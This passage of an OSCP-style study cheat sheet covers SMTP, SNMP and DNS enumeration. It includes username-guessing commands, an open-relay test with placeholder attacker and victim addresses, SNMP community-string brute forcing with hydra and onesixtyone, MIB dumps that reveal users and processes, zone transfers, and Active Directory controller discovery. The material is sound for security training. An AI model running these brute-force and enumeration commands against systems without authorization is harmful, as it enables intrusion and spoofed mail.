EXPN expands a mailing-list/alias name to its member addresses — useful against Sendmail-family servers where it's enabled; often disabled alongside VRFY.

**Manual username enumeration with RCPT TO (full transaction)**
```
nc -nv <target> 25
HELO test
MAIL FROM:<test@test.com>
RCPT TO:<root@target.com>
```
Works even when VRFY/EXPN are disabled, since the server must validate the recipient during a real delivery attempt; `250`/`550` responses reveal valid vs. invalid mailboxes. This is the most reliable manual technique against hardened Postfix/Exim.

**smtp-user-enum — VRFY mode (default)**
```
smtp-user-enum.pl -M VRFY -U users.txt -t <target>
```
Iterates a username wordlist against the target using VRFY (default mode when `-M` omitted); reports each guess as valid/invalid based on the SMTP response code.

**smtp-user-enum — EXPN mode, single user**
```
smtp-user-enum.pl -M EXPN -u admin -t <target>
```
Tests a single username via EXPN instead of a wordlist; `-u` for one user vs `-U file` for a list.

**smtp-user-enum — RCPT mode with domain suffix**
```
smtp-user-enum.pl -M RCPT -D example.com -U users.txt -t <target>
```
`-M RCPT` enumerates via the `MAIL FROM`/`RCPT TO` transaction (bypasses disabled VRFY/EXPN); `-D` appends the domain to build full email addresses (e.g. `root@example.com`); `-f` can override the MAIL FROM address (default `user@example.com`).

**smtp-user-enum against multiple targets**
```
smtp-user-enum.pl -M VRFY -U users.txt -T targets.txt -m 5 -p 25
```
`-T` points to a file of target IPs instead of a single `-t`; `-m` sets max parallel worker processes (default 5); `-p` sets the SMTP port.

**Nmap smtp-enum-users NSE script**
```
nmap -p25 --script smtp-enum-users <target>
```
Nmap's built-in equivalent to smtp-user-enum; attempts VRFY, then falls back to EXPN and RCPT TO using its bundled username list (or a custom one via `--script-args smtp-enum-users.methods=RCPT,userdb=<file>`).

**Run every SMTP NSE script at once**
```
nmap -p25 --script "smtp*" <target>
```
Convenience sweep covering smtp-commands, smtp-enum-users, smtp-open-relay, smtp-ntlm-info, and the smtp-vuln-* CVE checks in one pass.

**Manual open relay test (netcat/telnet)**
```
nc -nv <target> 25
HELO attacker.com
MAIL FROM:<attacker@external.com>
RCPT TO:<victim@externaldomain.com>
DATA
Subject: relay test

This is an open relay test.
.
```
If the server accepts a `RCPT TO` for a recipient on a domain the server does NOT itself host, and completes the `DATA`/`.` sequence with a `250` OK, it is functioning as an open relay usable for spoofed mail/phishing pivots.

**Nmap open relay test**
```
nmap -p25 --script smtp-open-relay <target>
```
or with explicit args:
```
nmap --script smtp-open-relay.nse --script-args smtp-open-relay.domain=example.com -p 25,465,587 <target>
```
Automates the MAIL FROM/RCPT TO relay test using 16 predefined header/envelope combinations and reports which succeed.

---

## 2. SNMP Enumeration

### Overview
SNMP (UDP/161, traps on UDP/162) is frequently left on default/weak community strings (`public` read-only, `private` read-write) and, once accessed, dumps an enormous amount of host information via its MIB tree — process lists, installed software, local users, routes, listening TCP ports, and (on legacy Windows LAN Manager SNMP agents) domain accounts and shares. OSCP workflow: (1) confirm the port is open/service is live, (2) brute-force the community string, (3) dump the full MIB with the discovered string, (4) pull targeted OIDs for high-value info disclosure.

### Findings

**Nmap UDP discovery**
```
nmap -sU -p161 --open <target>
nmap -sU -p161 -sV --script snmp-info <target>
```
Confirms UDP/161 is open and, if so, fingerprints the SNMP agent/version via `snmp-info`.

**onesixtyone — single host, wordlist brute force**
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
```
Fires SNMP `GET` requests for `sysDescr` using every string in the wordlist (default 10ms interval — very fast) and reports any string that returns a response, since invalid community strings in v1/v2c simply get no reply.

**onesixtyone — explicit port**
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p 161 <target>
```
Same as above with the port pinned explicitly (useful if SNMP is on a non-default port).

**onesixtyone — multiple targets from a file**
```
onesixtyone -c community.txt -i targets.txt
```
`-i` supplies a file of target IPs so the same wordlist is brute-forced across an entire subnet/host list in one run.

**Nmap snmp-brute NSE script**
```
nmap -sU -p161 --script snmp-brute <target>
```
Alternative brute-forcer built into Nmap; uses its default community-string list (or `--script-args snmp-brute.communitiesdb=<file>` for a custom one).

**Hydra SNMP brute force**
```
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -t 8 -w 1 -f -v -V <target> snmp
```
General-purpose brute forcer as an alternative to onesixtyone; `-f` stops on first valid string found, `-V` shows every attempt.

**snmpwalk — full MIB dump, SNMPv1**
```
snmpwalk -v1 -c public <target>
```
Recursively walks the entire OID tree the community string has access to under SNMPv1, dumping every value the agent exposes — the standard first move once a valid string is found.

**snmpwalk — full MIB dump, SNMPv2c**
```
snmpwalk -v2c -c public <target>
```
Same full dump using SNMPv2c, which most modern devices default to; try both v1 and v2c since a device may only respond to one.

**snmpwalk — targeted OID dump**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2
```
Walks only the given OID subtree instead of the whole MIB — use this once you know which branch (e.g. running processes) you want without the noise of a full dump.

**snmp-check — full formatted enumeration**
```
snmp-check <target> -c public
```
Wraps snmpwalk-equivalent queries and pretty-prints them into labeled sections (hostname, uptime, contact, network interfaces, storage, running processes, listening TCP ports, installed software) — faster to read than raw snmpwalk output.

**snmp-check — full option set**
```
snmp-check <target> -p 161 -c public -v 2c -w -t 5 -r 1
```
`-p` port (default 161), `-c` community (default `public`), `-v` SNMP version (1 or 2c, default 1), `-w` also attempts write-access detection, `-t` timeout seconds (default 5), `-r` retry count.

**Nmap SNMP NSE sweep**
```
nmap -sU -p161 --script "snmp* and not snmp-brute" <target>
```
Runs every SNMP-related NSE script except the brute-forcer (which you'd run separately/more slowly) — covers snmp-sysdescr, snmp-processes, snmp-win32-users, snmp-win32-shares, snmp-interfaces, snmp-netstat, snmp-info in one pass.

**Metasploit snmp_enum auxiliary module**
```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <target>
set COMMUNITY public
run
```
Metasploit's built-in full enumerator — alternative to snmp-check for structured output (hardware, storage, users, processes, network config). **Exam caveat: like all Metasploit modules, this is only usable against the single machine you've designated for Metasploit use on exam day — do not run it against multiple targets; `snmp-check`/`snmpwalk` above are the exam-safe, reusable equivalents.**

**Useful OID — system description**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0
```
`sysDescr` (RFC1213-MIB) — discloses OS name/version, kernel build, or device firmware in one query; fast way to fingerprint the host without a full walk.

**Useful OID — hostname**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0
```
`sysName` — the configured system/host name.

**Useful OID — running processes**
```
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.4.2.1.2
```
`hrSWRunName` (HOST-RESOURCES-MIB) — lists every running process by name; combine with `.1.3.6.1.2.1.25.4.2.1.4` (`hrSWRunPath`) to get executable paths, occasionally revealing credentials passed as CLI arguments (visible to SNMP the same way `ps aux` would show them).

**Useful OID — installed software**
```
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.6.3.1.2
```
`hrSWInstalledName` — enumerates installed software packages/patch level, useful for identifying outdated or vulnerable installed applications on the target.

**Useful OID — storage/mounted filesystems**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.2.3.1.3
```
`hrStorageDescr` (HOST-RESOURCES-MIB `hrStorageEntry` column 3) — lists disk partitions/mount points; combine with sibling columns `.4`/`.5`/`.6` (`hrStorageAllocationUnits`/`hrStorageSize`/`hrStorageUsed`) for allocation units and size, useful for recon of disk layout before further exploitation.

**Useful OID — network interfaces / IP addresses**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2.1.2
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20.1.1
```
`ifDescr` (IF-MIB) lists interface names; `ipAdEntAddr` (IP-MIB) lists bound IPv4 addresses — reveals internal/second NICs and additional subnets not visible from a single external scan.

**Useful OID — listening/established TCP connections**
```
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.1
```
`tcpConnState`/`tcpConnTable` (RFC1213-MIB `tcpConnEntry` column 1; walk `1.3.6.1.2.1.6.13.1` for the whole table) — effectively a remote `netstat`, revealing internal-only listening services not reachable/visible from your scanning position.

**Useful OID — Windows local user accounts (legacy LAN Manager MIB)**
```
snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25
```
On older Windows hosts running the legacy SNMP service with the LAN Manager MIB extension, this OID dumps local Windows user accounts directly — a well-known OSCP/HTB technique for username enumeration without any auth.

**snmpbulkwalk — faster full dump for large MIBs**
```
snmpbulkwalk -v2c -c public <target> .
```
Uses `GETBULK` instead of repeated `GETNEXT`, pulling multiple OIDs per request — noticeably faster than `snmpwalk` against devices exposing large MIB trees (e.g. big routers/switches).

**Edge case — SNMPv3 (no community string, user-based security)**
SNMPv3 replaces the plaintext community string with per-user authentication (`authNoPriv`/`authPriv`) and optional encryption, so `onesixtyone`/`hydra`-style community brute forcing does not apply — a device with v1/v2c fully disabled (common on hardened routers/exam boxes) still responds to v3 with a valid/guessed username.
```
# discover whether v3 is enabled/usable and enumerate a valid engineID with no creds
snmpwalk -v3 -l noAuthNoPriv -u <username-guess> <target>

# authNoPriv: username + auth protocol/password, no encryption
snmpwalk -v3 -l authNoPriv -u admin -a MD5 -A <auth_password> <target>

# authPriv: username + auth (MD5/SHA) + privacy/encryption (DES/AES) — full v3 auth
snmpwalk -v3 -l authPriv -u admin -a SHA -A <auth_password> -x AES -X <priv_password> <target>

# Metasploit/nmap can brute the v3 username itself since usernames (unlike v2c strings) are
# sometimes unauthenticated-readable via engine discovery:
nmap -sU -p161 --script snmp-info <target>
```
Explanation: try `noAuthNoPriv` first (some devices leak `sysDescr`/engineID to any valid username with no password); if that fails, brute the username against common defaults (`admin`, `public`, vendor defaults) before attempting auth/priv passwords — this is a materially different workflow from v1/v2c and easy to miss if a candidate only rehearses community-string brute forcing.

---

## Tools Table

| Tool | Purpose | Typical Invocation |
|---|---|---|
| `nc` / `telnet` | Manual raw SMTP interaction (banner grab, HELO/EHLO, VRFY, EXPN, RCPT TO, relay test) | `nc -nv <target> 25` |
| `nmap` (NSE) | Service detection + scripted SMTP/SNMP enumeration | `nmap -p25 --script "smtp*" <target>` / `nmap -sU -p161 --script "snmp*" <target>` |
| `smtp-user-enum` (pentestmonkey/cytopia) | Dedicated SMTP username-guessing via VRFY/EXPN/RCPT | `smtp-user-enum.pl -M VRFY -U users.txt -t <target>` |
| `swaks` | Scriptable SMTP transaction tool, useful for building custom relay/phishing tests | `swaks --to victim@ext.com --from test@ext.com --server <target>` |
| `onesixtyone` | Fast SNMP community-string brute forcer | `onesixtyone -c community.txt <target>` |
| `snmp-brute` (NSE) | Nmap's built-in SNMP community brute forcer | `nmap -sU -p161 --script snmp-brute <target>` |
| `hydra` | General brute forcer, supports the `snmp` module | `hydra -P wordlist.txt -v -V <target> snmp` |
| `snmpwalk` / `snmpbulkwalk` (net-snmp) | Full or targeted MIB tree dump once a community string is known | `snmpwalk -v2c -c public <target>` |
| `snmp-check` | Formatted/structured SNMP enumeration (readable output vs raw snmpwalk) | `snmp-check <target> -c public` |
| Metasploit `snmp_enum` | Structured SNMP host enumeration module | `use auxiliary/scanner/snmp/snmp_enum` |

---

## Sources Consulted
- [pentestmonkey/smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) and [README](https://github.com/pentestmonkey/smtp-user-enum/blob/master/README.md)
- [smtp-commands NSE](https://nmap.org/nsedoc/scripts/smtp-commands.html), [smtp-open-relay NSE](https://nmap.org/nsedoc/scripts/smtp-open-relay.html), [snmp-brute NSE](https://nmap.org/nsedoc/scripts/snmp-brute.html) — Nmap Scripting Engine docs
- [SMTP Enumeration (Port 25) — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smtp-enumeration-port-25)
- [SNMP Enumeraion (Port 161) — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion)
- [Enumerating SMTP Servers with NMAP — Medium](https://medium.com/@minimalist.ascent/enumerating-smtp-servers-with-nmap-2a92c7b2c8de)
- [Mail server / SMTP Enumeration — hcs0](https://hannahsuarez.github.io/2017/smtp-enumeration/)
- [Pentesting SNMP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
- [Find SNMP Community String using Onesixtyone — InfosecOne](https://infosecone.com/blog/find-snmp-community-string-using-onesixtyone/)
- [SNMP pentesting — Infosec Institute](https://www.infosecinstitute.com/resources/penetration-testing/snmp-pentesting/)
- [Enumerating SNMP for Pentesting — Infinite Logins](https://infinitelogins.com/2021/02/21/enumerating-snmp-for-pentesting-udp-ports-161-162/)
- [snmpcheck — Kali Linux Tools](https://www.kali.org/tools/snmpcheck/)
- [SNMPWALK Examples for Windows and Linux — ITT Systems](https://www.ittsystems.com/snmpwalk-examples/)
- [htb-Penetration-Testing-Cheat-Sheet SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
- [SNMP.md — TheSnowWight/hackdocs](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/pentesting-snmp/README.md)
- [useful SNMP OIDs — Medium (joelzhang)](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0)
- [Common OIDs Of SNMP — LuLeey](https://www.luleey.com/common-oids-of-snmp/)
- [SNMP Process OIDs — SNMP Monitoring](https://snmp-monitoring.info/sensors/processes/)
- [OSCP Cheat Sheet and Command Reference — Cas van Cooten](https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/)

---

---

## DNS Enumeration

### Overview
DNS is one of the first services enumerated on both external and internal (AD) OSCP-style targets because it is low-noise, unauthenticated, and frequently misconfigured. The workflow typically progresses:

1. Identify authoritative name servers (`NS` records) for the target domain.
2. Attempt a full zone transfer (`AXFR`) against each name server — the highest-value, lowest-effort win.
3. Pull standard record types (`A`, `MX`, `TXT`, `SOA`, `NS`) manually with `dig`/`host`.
4. Run automated tools (`dnsrecon`, `dnsenum`, `fierce`) to combine zone transfer attempts, brute forcing, and Google/whois scraping.
5. Brute force subdomains against a wordlist when zone transfer fails (the common case on hardened/modern servers).
6. Reverse-resolve discovered IP ranges (PTR lookups) to catch additional in-scope hosts.
7. On internal/AD assessments, query DNS `SRV` records to locate domain controllers, global catalog servers, and Kerberos/LDAP endpoints — all without needing credentials or domain membership.

---

### 1. Enumerate authoritative name servers first
**Command:**
```bash
dig ns example.com +short
host -t ns example.com
```
**Explanation:** Before attempting a zone transfer you need the list of authoritative name servers to target individually — a domain's primary registrar-listed NS records are the addresses you point `axfr` requests at.
**Source:** https://nairuzabulhul.gitbooks.io/oscp-roadmap/content/level-3/network-cheatsheets/dns.html

### 2. Zone transfer with `dig axfr`
**Command:**
```bash
dig axfr @ns1.example.com example.com
dig axfr example.com @ns2.example.com
```
**Explanation:** Requests a full `AXFR` (all zone records) from a specific name server. Must be repeated against every NS for the domain since only one may be misconfigured to allow anonymous transfers. A successful transfer dumps every `A`, `AAAA`, `CNAME`, `MX`, `TXT`, and `SRV` record in the zone, often revealing internal hostnames and infrastructure.
**Source:** https://offsectoolkit.github.io/OffSecToolKit/Dig-zone-transfer/ , https://hackertarget.com/zone-transfer/

### 3. Zone transfer against the public training lab (validation of technique)
**Command:**
```bash
dig axfr zonetransfer.me @nsztm1.digi.ninja
```
**Explanation:** `zonetransfer.me` is a domain intentionally left open to `AXFR` for practicing this exact technique — useful for confirming your syntax works before pointing it at a real OSCP target.
**Source:** https://hackertarget.com/zone-transfer/

### 4. Zone transfer with `host`
**Command:**
```bash
host -t axfr example.com ns1.example.com
host -l example.com ns1.example.com
```
**Explanation:** `host -t axfr <domain> <nameserver>` explicitly requests the AXFR record type; `host -l <domain> <nameserver>` ("list") is the classic shorthand that also triggers a zone transfer and lists all hosts in the zone. Both are equivalent alternates to `dig` and are worth trying since some servers behave differently depending on the query tool/library used.
**Source:** https://www.cyberciti.biz/tips/howto-restrict-unauthorized-zone-transfers-dns-bind.html , https://github.com/undergroundwires/CEH-in-bullet-points/blob/master/chapters/04-enumeration/dns-enumeration.md

### 5. Zone transfer with Nmap NSE (cross-check tool)
**Command:**
```bash
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com -p 53 ns1.example.com
```
**Explanation:** Confirms/automates the AXFR test as part of a broader Nmap scan against port 53; useful when you're already running Nmap against a discovered DNS service and want a quick built-in check alongside manual `dig`/`host` attempts.
**Source:** https://nmap.org/nsedoc/scripts/dns-zone-transfer.html

### 6. `dnsrecon` — general/standard scan
**Command:**
```bash
dnsrecon -d example.com -t std
```
**Explanation:** `-t std` runs the standard enumeration: `SOA`, `NS`, `A`, `AAAA`, `MX`, and `SRV` lookups, plus an automatic check for zone transfer against each NS found. This is normally the first `dnsrecon` command run against any target domain.
**Source:** https://en.kali.tools/?p=1149 , https://www.thegeekdiary.com/dnsrecon-command-examples-in-linux/

### 7. `dnsrecon` — zone transfer against all name servers
**Command:**
```bash
dnsrecon -d example.com -t axfr
```
**Explanation:** Iterates through every discovered NS record and attempts `AXFR` against each automatically, saving you from manually looping `dig axfr` per server.
**Source:** https://ccgit.crown.edu/cyber-reels/oscp-dns-enumeration-your-ultimate-guide-1764799701

### 8. `dnsrecon` — subdomain brute force
**Command:**
```bash
dnsrecon -d example.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
```
**Explanation:** `-t brt` brute forces subdomains/hostnames using the wordlist supplied with `-D`, resolving each candidate to `A`/`AAAA` records. This is the fallback when zone transfer is refused (the common case).
**Source:** https://en.kali.tools/?p=1149

### 9. `dnsrecon` — combined multi-technique scan with structured output
**Command:**
```bash
dnsrecon -d example.com -t std,brt,axfr -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -j results.json
```
**Explanation:** Chains multiple scan types (`std`, `brt`, `axfr`) in one invocation and writes machine-readable JSON output (`-j`) for later parsing/reporting — practical for OSCP report note-taking.
**Source:** https://kb.offsec.nl/tools/osint/dnsrecon/

### 10. `dnsrecon` — reverse lookup over an IP range
**Command:**
```bash
dnsrecon -r 10.11.1.1-10.11.1.254
dnsrecon -r 10.11.1.0/24
```
**Explanation:** `-r` performs PTR (reverse) lookups across an IP range or CIDR block, useful for sweeping an internal subnet for hostnames that reveal roles (e.g., `dc01.corp.local`, `mail.corp.local`).
**Source:** https://raw.githubusercontent.com/darkoperator/dnsrecon/master/README.md (README description of `-r` reverse-lookup capability)

### 11. `dnsrecon` — SRV record enumeration (AD-relevant)
**Command:**
```bash
dnsrecon -d corp.local -t srv
```
**Explanation:** Explicitly pulls SRV records, which on an AD domain include the LDAP/Kerberos/Global Catalog service locations used to fingerprint domain controllers — see AD section below for the manual equivalents.
**Source:** https://en.kali.tools/?p=1149

### 12. `dnsenum` — default scan
**Command:**
```bash
dnsenum example.com
```
**Explanation:** With no extra flags, `dnsenum` pulls `NS`/`MX`/`A` records, tries a zone transfer against each name server automatically, and performs Google scraping/whois by default — a fast first pass equivalent to `dnsrecon -t std,axfr`.
**Source:** https://neverendingsecurity.wordpress.com/2015/04/07/dnsenum-cheatsheet/

### 13. `dnsenum` — subdomain brute force with a dictionary
**Command:**
```bash
dnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.xml example.com
```
**Explanation:** `--enum` is shorthand for `--threads 5 -s 15 -w` (5 threads, 15 Google-scrape results, whois lookups enabled); `-f` supplies the brute-force wordlist; `-o` writes structured XML output. This is the classic OSCP "throw a big list at it" `dnsenum` invocation.
**Source:** https://neverendingsecurity.wordpress.com/2015/04/07/dnsenum-cheatsheet/ , https://hackercoolmagazine.com/complete-guide-to-dnsenum/

### 14. `dnsenum` — against a specific name server, skipping reverse lookups
**Command:**
```bash
dnsenum --dnsserver 8.8.8.8 --noreverse -f dns.txt example.com
```
**Explanation:** `--dnsserver` forces `dnsenum` to query a specific resolver instead of the system default (useful when the target's internal DNS server must be queried directly, e.g., an AD DC); `--noreverse` skips the (often slow) reverse-lookup pass when you only need forward brute forcing.
**Source:** https://neverendingsecurity.wordpress.com/2015/04/07/dnsenum-cheatsheet/

### 15. `fierce` — basic domain scan (auto zone-transfer attempt + brute force)
**Command:**
```bash
fierce --domain example.com
```
**Explanation:** The Kali-packaged Python rewrite of Fierce (`mschwager/fierce`) first attempts a zone transfer against each authoritative NS, and if that fails, falls back to brute forcing a built-in default subdomain wordlist. It's designed as a lightweight precursor to deeper scanning (Nmap, etc.), matching the classic "wide net" step in OSCP recon.
**Source:** https://github.com/bbhunter/fierce-domain-scanner (legacy Perl usage reference) — Kali's current tool: https://www.kali.org/tools/fierce/

### 16. `fierce` — brute force with a custom wordlist and specific DNS server
**Command:**
```bash
fierce --domain example.com --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --dns-servers 8.8.8.8
```
**Explanation:** `--subdomain-file` replaces the tool's small default list with SecLists for broader coverage; `--dns-servers` pins which resolver is used, important when internal DNS must be queried instead of a public resolver.
**Source:** https://github.com/bbhunter/fierce-domain-scanner (equivalent legacy flags: `-wordlist`, `-dnsserver`)

### 17. `fierce` — widen search around discovered IPs
**Command:**
```bash
fierce --domain example.com --wide
```
**Explanation:** Once a hostname resolves, `--wide` scans the entire /24 (class C) that address falls in for other in-scope hosts sharing the same DNS server — good for uncovering neighboring, non-obviously-named internal hosts.
**Source:** https://github.com/bbhunter/fierce-domain-scanner (legacy `-search`/traverse behavior documented; current flag name `--wide` per Kali fierce)

### 18. Manual subdomain brute force loop (no tooling dependency)
**Command:**
```bash
for sub in $(cat subdomains.txt); do
  host "$sub.example.com" | grep "has address"
done
```
**Explanation:** The fallback, tool-independent brute-force pattern OSCP candidates are expected to be able to reproduce by hand when automated tools are unavailable or blocked; simply resolves each candidate name and filters for successful `A` record answers.
**Source:** https://gabb4r.gitbook.io/oscp-notes/service-enumeration/dns-enumeration-port-53

### 19. `gobuster dns` — modern brute-force alternative
**Command:**
```bash
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 8.8.8.8 -t 20
```
**Explanation:** `gobuster`'s `dns` mode is a fast, multithreaded (`-t`) subdomain brute forcer; `-r` sets the resolver, `-w` the wordlist. Frequently used alongside/instead of `dnsenum`/`fierce` for speed on larger wordlists.
**Source:** https://gobuster.org/can-gobuster-be-used-for-subdomain-enumeration/ , https://hackertarget.com/gobuster-tutorial/

### 20. Reverse DNS (PTR) lookup with `dig`
**Command:**
```bash
dig -x 10.11.1.5 +short
```
**Explanation:** `-x` auto-builds the `in-addr.arpa` reverse query for the given IP and returns the associated hostname if a PTR record exists; `+short` trims output to just the answer. Used to identify hostnames for IPs discovered during host/network scanning.
**Source:** https://www.rootusers.com/12-dig-command-examples-to-query-dns-in-linux/

### 21. Reverse DNS (PTR) lookup with `host`
**Command:**
```bash
host 10.11.1.5
```
**Explanation:** When passed a raw IP address (rather than a name), `host` automatically performs the reverse PTR lookup — the quickest single-host equivalent to `dig -x`.
**Source:** https://www.howtouselinux.com/post/reverse-dns-lookup

### 22. Reverse DNS sweep across a subnet with Nmap
**Command:**
```bash
nmap -sL 10.11.1.0/24
```
**Explanation:** Nmap's list scan (`-sL`) performs no port scanning at all — it just does reverse-DNS resolution for every host in the range by default, giving a fast bulk PTR sweep as an alternative to looping `dig -x`/`host` per address. Do **not** add `-n` here — `-n` disables all DNS resolution and would defeat the entire point of `-sL` (per nmap's own docs, `-sL -n` prints targets with no DNS lookups at all).
**Source:** https://www.howtouselinux.com/post/reverse-dns-lookup (general reverse-lookup technique reference); https://nmap.org/book/host-discovery-list-scan.html

### 23. AD domain controller discovery via LDAP SRV record
**Command:**
```bash
dig srv _ldap._tcp.dc._msdcs.corp.local
```
**Explanation:** Active Directory registers every domain controller under the `_ldap._tcp.dc._msdcs.<domain>` SRV record. Querying it returns the hostname(s), priority/weight, and port (389) of all DCs for the domain — works anonymously over DNS, no domain membership or credentials required, making it one of the first commands run once an AD domain name is known.
**Source:** https://en.ittrip.xyz/windows-server/ad-dns-srv-domain-join

### 24. AD domain controller discovery via `nslookup`
**Command:**
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.corp.local
```
**Explanation:** Functional equivalent to the `dig` query above using `nslookup`'s `-type=srv` flag; commonly used interchangeably depending on what's available on the attack host.
**Source:** https://albarich.wordpress.com/2018/02/16/check-ldap-dns-using-nslookup/

### 25. Locate the PDC emulator specifically
**Command:**
```bash
dig srv _ldap._tcp.pdc._msdcs.corp.local
```
**Explanation:** A more specific SRV query that returns only the domain controller currently holding the PDC Emulator FSMO role — useful when targeting the DC most likely to handle password changes/authoritative time sync.
**Source:** https://www.thehacker.recipes/ad/recon/dns

### 26. Locate Global Catalog servers
**Command:**
```bash
dig srv _gc._tcp.corp.local
```
**Explanation:** Identifies domain controllers also serving as Global Catalog servers (port 3268/3269), which hold a partial, searchable replica of all objects in the forest — relevant for forest-wide LDAP queries in later AD enumeration stages.
**Source:** https://en.ittrip.xyz/windows-server/ad-dns-srv-domain-join

### 27. Locate Kerberos KDCs
**Command:**
```bash
dig srv _kerberos._tcp.corp.local
```
**Explanation:** Returns the Kerberos Key Distribution Center service records, effectively confirming the DC hosts again from the authentication side — corroborates DC identification and is useful before Kerberos-based attacks (AS-REP roasting, Kerberoasting, etc.) in later phases.
**Source:** https://www.thehacker.recipes/ad/recon/dns

### 28. Dump every record in the AD-integrated zone at once
**Command:**
```bash
dig any corp.local @<dc-ip>
```
**Explanation:** Pointed directly at a discovered DC's IP, an `ANY` query (where still supported) can return the domain's `A`, `NS`, `SOA`, and `SRV` records in one shot, giving a fast overview of the AD DNS zone once you have at least one DC IP.
**Source:** https://www.thehacker.recipes/ad/recon/dns

---

## Tools Table

| Tool | Primary Use in OSCP Recon | Key Flags | Notes |
|---|---|---|---|
| `dig` | Manual queries: AXFR, NS/A/MX/SRV lookups, reverse PTR | `axfr`, `@server`, `-x`, `srv`, `+short`, `any` | Always available on Kali; the most flexible/manual tool, foundation for all others |
| `host` | Quick manual AXFR attempts and reverse lookups | `-t axfr`, `-l`, `-t srv`, bare IP for PTR | Simpler output than `dig`; good sanity-check alternative |
| `nslookup` | Interactive/manual SRV and record queries, cross-platform (incl. Windows targets) | `-type=srv`, `-type=any` | Useful when working from a Windows foothold as well as Linux attack box |
| `dnsrecon` | Automated all-in-one: std records, AXFR, brute force, reverse range, SRV, JSON/CSV/XML output | `-d`, `-t std/axfr/brt/srv/rvl`, `-D`, `-r`, `-j/-c/--xml` | Python; combinable scan types via comma list; strong reporting output |
| `dnsenum` | Automated recon combining AXFR, brute force, Google scraping, whois | (default), `--enum`, `-f`, `--dnsserver`, `--noreverse`, `-o` | Perl; heavier default behavior (auto Google/whois) than `dnsrecon` |
| `fierce` | Lightweight AXFR + brute force + neighbor-IP widening, precursor to deeper scanning | `--domain`, `--subdomain-file`, `--dns-servers`, `--wide` | Kali ships the Python rewrite (`mschwager/fierce`); legacy Perl `fierce.pl` used older flag names (`-dns`, `-wordlist`) |
| `gobuster` (`dns` mode) | Fast multithreaded subdomain brute forcing | `dns -d`, `-w`, `-r`, `-t` | Preferred when speed against large wordlists (e.g., SecLists) matters |
| Nmap (`dns-zone-transfer` NSE) | Cross-check/automate AXFR as part of a port-53 scan | `--script dns-zone-transfer --script-args dns-zone-transfer.domain=` | Convenient when DNS is already being scanned with Nmap |
| Bash loop + `host`/`dig` | Manual, tool-independent subdomain brute force or PTR sweep | plain shell `for` loop | Fallback technique OSCP exam takers should know without relying on installed tools |

---

**Sources referenced:**
- [OSCP DNS Enumeration Guide](https://ccgit.crown.edu/cyber-reels/oscp-dns-enumeration-your-ultimate-guide-1764799701)
- [HackerTarget – Zone Transfer Test](https://hackertarget.com/zone-transfer/)
- [OSCP Roadmap – DNS Cheatsheet](https://nairuzabulhul.gitbooks.io/oscp-roadmap/content/level-3/network-cheatsheets/dns.html)
- [OffSecToolKit – dig zone transfer](https://offsectoolkit.github.io/OffSecToolKit/Dig-zone-transfer/)
- [OSCP-Study-Guide (muckitymuck) – active information gathering](https://github.com/muckitymuck/OSCP-Study-Guide/blob/master/enumeration/active_information_gathering.md)
- [OSCP Notes – DNS Enumeration (Port 53)](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/dns-enumeration-port-53)
- [Vespersec – DNS Lookups and Zone Transfers Cheat Sheet](https://vespersec.net/docs/osint-reconnaissance/dns-lookups-and-zone-transfers-cheat-sheet/)
- [Wikipedia – DNS zone transfer](https://en.wikipedia.org/wiki/DNS_zone_transfer)
- [nixCraft – Restricting zone transfers with IP addresses](https://www.cyberciti.biz/tips/howto-restrict-unauthorized-zone-transfers-dns-bind.html)
- [CEH-in-bullet-points – DNS Enumeration](https://github.com/undergroundwires/CEH-in-bullet-points/blob/master/chapters/04-enumeration/dns-enumeration.md)
- [Nmap NSE – dns-zone-transfer](https://nmap.org/nsedoc/scripts/dns-zone-transfer.html)
- [dnsrecon GitHub (darkoperator)](https://github.com/darkoperator/dnsrecon)
- [dnsrecon CLI Reference (DeepWiki)](https://deepwiki.com/darkoperator/dnsrecon/2-cli-reference)
- [en.kali.tools – DNSRecon](https://en.kali.tools/?p=1149)
- [The Geek Diary – dnsrecon Command Examples](https://www.thegeekdiary.com/dnsrecon-command-examples-in-linux/)
- [offsec.nl KB – DNSrecon](https://kb.offsec.nl/tools/osint/dnsrecon/)
- [Pentest Lab – DNS Reconnaissance with DNSRecon](https://pentestlab.blog/2012/11/13/dns-reconnaissance-dnsrecon/)
- [DNSenum Cheatsheet – Never Ending Security](https://neverendingsecurity.wordpress.com/2015/04/07/dnsenum-cheatsheet/)
- [Kitsun3Sec Pentest-Cheat-Sheets – DNS](https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/tree/master/CheatSheets/DNS)
- [Kali Tools – dnsenum](https://www.kali.org/tools/dnsenum/)
